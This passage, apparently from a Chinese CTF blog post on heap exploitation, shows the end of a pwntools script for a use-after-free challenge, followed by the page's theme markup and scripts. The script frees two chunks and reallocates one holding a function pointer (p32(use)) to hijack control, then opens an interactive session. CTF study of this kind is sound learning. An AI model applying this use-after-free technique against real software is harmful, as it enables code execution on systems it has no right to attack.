main&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;bbbb&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>, p32(use))<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%A0%86/" class="category-chain-item">堆</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/UAF/" class="print-no-link">#UAF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/" title="一次艰难的堆探索">
+                        <span class="hidden-mobile">一次艰难的堆探索</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>TKYmax</span></a> <i class="iconfont icon-love"></i> <span>GX</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
